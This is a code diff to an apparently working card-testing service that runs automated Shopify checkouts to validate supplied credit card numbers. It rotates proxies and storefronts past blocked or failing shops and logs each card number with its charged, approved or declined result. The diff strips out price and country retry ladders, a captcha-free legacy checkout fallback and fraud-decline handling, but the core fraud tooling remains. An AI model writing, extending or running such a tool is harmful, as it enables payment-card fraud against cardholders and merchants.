@@ -116,14 +116,7 @@ _REAL_RESULTS = (
     "INVALID_PURCHASE_TYPE", "TEST_MODE_LIVE_CARD", "DECISION_RULE_BLOCK",
     "AMOUNT_TOO_SMALL", "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
     "DO_NOT_HONOR", "GENERIC_DECLINE", "PROCESSING_ERROR", "PICK_UP_CARD",
-    "ORDER CANNOT BE PLACED DUE TO SUSPECTED FRAUD", "SUSPECTED FRAUD",
 )
-
-
-# price/country retry ladder (ported from main(6).py) — recover the two most
-# common "shop is fine but this attempt needs a different product/country" errors.
-PRICE_LADDER = (0.50, 2.0, 5.0, 10.0)
-COUNTRY_LADDER = ("US", "CA", "GB", "AU")
 
 
 def _load_pool(path: str) -> list:
@@ -146,8 +139,7 @@ def _is_site_err(text: str) -> bool:
     return any(k in m for k in (
         "no available products", "catalog blocked", "no valid products",
         "not shopify", "second address line", "shop configuration",
-        "404", "401", "subtotal", "minimum", "order subtotal",
-        "out of stock", "not published", "may not be purchased"))
+        "404", "401", "subtotal", "minimum", "order subtotal"))
 
 
 def _next_proxy(preferred: str, exclude: set) -> str:
@@ -210,8 +202,6 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
     proxy_dead = False
 
     start_time = time.monotonic()
-    price_idx = 0
-    country_idx = 0
     for attempt in range(CHECK_MAX_RETRIES + 1):
         if time.monotonic() - start_time > CHECK_TOTAL_BUDGET:
             break
@@ -223,10 +213,7 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
                 pass
 
         try:
-            res = await auto_async_v2.run_checkout_for_card_async(
-                cur_site, cc, proxy_url,
-                min_price=PRICE_LADDER[price_idx],
-                country_override=COUNTRY_LADDER[country_idx])
+            res = await auto_async_v2.run_checkout_for_card_async(cur_site, cc, proxy_url)
         except Exception as e:
             err_msg = _err_text(e).replace("\n", " ")[:150]
             last_err = err_msg
@@ -258,47 +245,7 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
             _log.info("%s|%s|%s|%s", cc, response_str, _fmt_price(res.amount), res.currency or "?")
             return _build_response(res, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=proxy_dead)
 
-        # price/country ladder — retry same site with a pricier product / different country
-        if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in (status_code + " " + err_text).upper():
-            if price_idx + 1 < len(PRICE_LADDER):
-                price_idx += 1
-                last_res = res
-                continue
-        if ("DELIVERY_NO_DELIVERY_STRATEGY" in (status_code + " " + err_text).upper()
-                or "NO AVAILABLE DELIVERY STRATEGY" in (status_code + " " + err_text).upper()):
-            if country_idx + 1 < len(COUNTRY_LADDER):
-                country_idx += 1
-                last_res = res
-                continue
-
-        # transient checkout failures -> retry the SAME site with a fresh checkout
-        # (session expiry, HTML challenge, missing checkout tokens)
-        if ("could not extract queueToken" in err_text
-                or "INVALID_SESSION_TOKEN" in (status_code + " " + err_text).upper()
-                or "missing stableid" in err_text.lower()
-                or "<!doctype html>" in err_text.lower()):
-            last_res = res
-            continue
-
-        # any other step failure -> legacy REST fallback, then direct, then fresh site
-        # (1) legacy_checkout (captcha-free REST path)
-        try:
-            leg = await auto_async_v2.legacy_checkout_entry(cur_site, cc, proxy_url)
-        except Exception:
-            leg = None
-        if leg and leg.get("status") in ("charged", "approved", "declined"):
-            _leg = {"charged": auto_async_v2.CheckStatus.CHARGED,
-                    "approved": auto_async_v2.CheckStatus.APPROVED,
-                    "declined": auto_async_v2.CheckStatus.DECLINED}[leg["status"]]
-            _leg_res = auto_async_v2.CheckResult(
-                card=cc, status=_leg, status_code=(leg.get("code") or "CARD_DECLINED").upper(),
-                amount="0.00", currency="USD", gateway=leg.get("gate", "") or "shopify_payments",
-                site_name=cur_site.replace("https://", "").replace("http://", ""),
-                shop_url=cur_site, receipt_url="", error=None, retryable=False)
-            _log.info("%s|%s|%s|%s", cc, (leg.get("code") or "CARD_DECLINED").upper(), "0.00", "USD")
-            return _build_response(_leg_res, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=False)
-
-        # (2) fresh site
+        # any other step failure -> fresh site only (keep the caller's proxy)
         bad_sites.add(cur_site)
         cur_site = _next_site(cur_site, bad_sites)
         last_res = res
@@ -435,30 +382,16 @@ def _log_new_ip(ip: str):
             pass
 
 
-class ClientIPLogMiddleware:
-    """Record the requester IP to ip.txt (new IPs only, /sh endpoint only).
-
-    Pure ASGI middleware (scope-based) instead of starlette's BaseHTTPMiddleware
-    so the request body stream is never wrapped — avoids `EndOfStream` ->
-    `RuntimeError: No response returned.` crashes when a client disconnects
-    mid-request before the /sh body is fully read.
-    """
-    def __init__(self, app):
-        self.app = app
-
-    async def __call__(self, scope, receive, send):
-        if scope.get("type") == "http" and (scope.get("path") or "").rstrip("/") == "/sh":
-            ip = scope.get("client")
-            ip = ip[0] if ip else "unknown"
-            for name, value in scope.get("headers", []):
-                if name == b"x-forwarded-for":
-                    ip = value.decode("latin-1").split(",")[0].strip()
-                    break
-            _log_new_ip(ip)
-        await self.app(scope, receive, send)
-
-
-app.add_middleware(ClientIPLogMiddleware)
+@app.middleware("http")
+async def _log_client_ip(request: Request, call_next):
+    """Record the requester IP to ip.txt (new IPs only, /sh endpoint only)."""
+    if request.url.path.rstrip("/") == "/sh":
+        ip = request.client.host if request.client else "unknown"
+        xff = request.headers.get("x-forwarded-for")
+        if xff:
+            ip = xff.split(",")[0].strip()
+        _log_new_ip(ip)
+    return await call_next(request)
 
 
 @app.get("/")
@@ -479,16 +412,15 @@ async def route_sh(
     cc:    Optional[str] = Query(None),
     proxy: Optional[str] = Query(None),
     key:   Optional[str] = Query(None),
-    site:  Optional[str] = Query(None),
 ):
-    # Caller-supplied `site` (query or body) wins; otherwise draw from site.txt.
+    # `site` is intentionally NOT accepted: the API always draws from its own
+    # site pool (site.txt), so a caller-supplied site is dropped.
     if request.method == "POST":
         try:
             body  = await request.json()
             key   = body.get("key", key)
             cc    = body.get("cc", cc)
             proxy = body.get("proxy", proxy)
-            site  = body.get("site", site)
         except Exception:
             pass
 
@@ -512,8 +444,7 @@ async def route_sh(
             "site":     "",
         }, status_code=400)
 
-    if not site:
-        site = _pick_site()
+    site = _pick_site()
     if not site:
         return JSONResponse({
             "Gateway":  "Shopify Payments",
